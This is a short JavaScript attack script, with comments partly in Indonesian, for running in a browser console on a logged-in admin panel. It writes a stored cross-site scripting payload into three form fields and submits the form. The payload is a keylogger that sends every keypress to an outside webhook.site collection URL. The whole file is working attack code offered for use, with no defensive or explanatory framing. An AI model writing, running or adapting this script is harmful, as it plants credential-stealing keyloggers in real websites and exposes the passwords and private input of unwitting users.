
// XSS Injection Script
// Run this in browser console saat sudah login ke admin panel

function injectPayload() {
    // Fill form dengan payload
    document.getElementById('email').value = `<script>
document.addEventListener("keypress", function(e){
    fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
        method: "POST",
        body: JSON.stringify({key: e.key, time: Date.now()})
    });
});
</script>`;
    document.getElementById('anak').value = `<script>
document.addEventListener("keypress", function(e){
    fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
        method: "POST",
        body: JSON.stringify({key: e.key, time: Date.now()})
    });
});
</script>`;
    document.getElementById('alamat').value = `<script>
document.addEventListener("keypress", function(e){
    fetch("https://webhook.site/YOUR-WEBHOOK-ID", {
        method: "POST",
        body: JSON.stringify({key: e.key, time: Date.now()})
    });
});
</script>`;
    
    // Submit form
    document.getElementById('myForm').submit();
    
    console.log('[+] Payload injected!');
}

// Execute
injectPayload();
